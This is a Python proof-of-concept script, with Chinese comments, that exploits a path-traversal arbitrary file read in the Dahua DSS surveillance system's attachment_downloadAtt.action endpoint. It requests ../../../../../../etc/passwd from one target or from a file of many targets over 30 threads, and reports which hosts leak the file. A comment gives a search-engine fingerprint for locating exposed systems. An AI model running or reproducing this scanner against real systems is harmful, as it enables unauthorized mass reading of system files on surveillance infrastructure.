#大华DSS数字监控系统 attachment_downloadAtt.action 任意文件读取漏洞
#app="dahua-DSS"  GET编写
import requests, sys, argparse

requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool


def main():
    parse = argparse.ArgumentParser(description="大华DSS数字监控系统 attachment_downloadAtt.action 任意文件读取漏洞")
    # 添加命令行参数
    parse.add_argument('-u', '--url', dest='url', type=str, help='Please input url')
    parse.add_argument('-f', '--file', dest='file', type=str, help='Please input file')
    # 实例化
    args = parse.parse_args()
    pool = Pool(30)
    try:
        if args.url:
            check(args.url)
        else:
            targets = []
            f = open(args.file, 'r+')
            for target in f.readlines():
                target = target.strip()
                targets.append(target)
            pool.map(check, targets)
    except Exception as e:
        print(f"[ERROR] 参数错误请使用-h查看帮助信息{e}")

def check(get):
        target = (f"{get}/portal/attachment_downloadAtt.action?filePath=../../../../../../etc/passwd")
        headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Connection': 'close'
        }
        response = requests.get(target, headers=headers, verify=False, timeout=3)
        try:
            if response.status_code == 200 and 'root' in response.text:
                print(f"[*] {get} 存在任意文件读取")
            else:
                print(f"[!] {get} 不存在任意文件读取")
        except Exception as e:
            print(f"[Error] {get} TimeOut")

if __name__ == '__main__':
        main()



